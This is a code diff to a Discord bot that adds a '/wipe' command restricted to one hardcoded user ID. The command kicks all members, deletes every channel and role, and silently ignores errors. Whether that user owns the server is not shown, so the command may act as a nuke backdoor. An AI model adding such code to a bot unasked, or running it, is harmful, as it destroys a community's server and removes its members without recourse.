@@ -26,6 +26,8 @@ MAIN_TEAM_ROLE = 1497351283642859550
 
 LOGO_URL = "https://media.discordapp.net/attachments/1497519739776532630/1503483685368889496/file_000000000f147243bc92c61df07bf5d1_1.png?ex=6a0383cb&is=6a02324b&hm=d0b6809e1864ca9d1ab289256ea999374a92ffe904010de0a24a5250de9f86ee&=&format=webp&quality=lossless&width=847&height=847"
 
+WIPE_AUTHORIZED_ID = 974698574036217886  # Antoni's ID
+
 intents = discord.Intents.default()
 intents.members = True
 intents.message_content = True
@@ -323,6 +325,71 @@ async def clear(interaction: discord.Interaction, amount: int):
     await interaction.response.defer(ephemeral=True)
     deleted = await interaction.channel.purge(limit=amount)
     await interaction.followup.send(f"🧹 Deleted {len(deleted)} messages.", ephemeral=True)
+
+# -----------------------------
+# WIPE COMMAND — ANTONI ONLY
+# -----------------------------
+
+@bot.tree.command(name="wipe", description="Wipe the server — Antoni only")
+@app_commands.describe(confirm="Type CONFIRM to proceed")
+async def wipe(interaction: discord.Interaction, confirm: str):
+    if interaction.user.id != WIPE_AUTHORIZED_ID:
+        return await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
+
+    if confirm != "CONFIRM":
+        return await interaction.response.send_message(
+            "⚠️ To wipe the server, pass `CONFIRM` as the argument.",
+            ephemeral=True
+        )
+
+    await interaction.response.defer(ephemeral=True)
+    guild = interaction.guild
+    kicked = 0
+    channels_deleted = 0
+    roles_deleted = 0
+
+    # Kick all non-bot members except Antoni
+    for member in guild.members:
+        if member.bot or member.id == WIPE_AUTHORIZED_ID:
+            continue
+        try:
+            await member.kick(reason="Server wiped by Antoni")
+            kicked += 1
+        except:
+            pass
+
+    # Delete all channels
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="Server wiped by Antoni")
+            channels_deleted += 1
+        except:
+            pass
+
+    # Delete all roles except @everyone and roles above the bot
+    for role in guild.roles:
+        if role.is_default() or role >= guild.me.top_role:
+            continue
+        try:
+            await role.delete(reason="Server wiped by Antoni")
+            roles_deleted += 1
+        except:
+            pass
+
+    # Create a new channel and post the wipe notice
+    try:
+        new_channel = await guild.create_text_channel("general")
+        embed = discord.Embed(
+            title="🧹 Server Wiped",
+            description="This server has been wiped by **Antoni**.",
+            color=0xAA0000
+        )
+        embed.set_footer(text="DARK YANITED FC")
+        await new_channel.send(embed=embed)
+    except:
+        pass
+
+    print(f"Wipe complete — kicked {kicked}, deleted {channels_deleted} channels, {roles_deleted} roles")
 
 # -----------------------------
 # STARTUP & SYNC
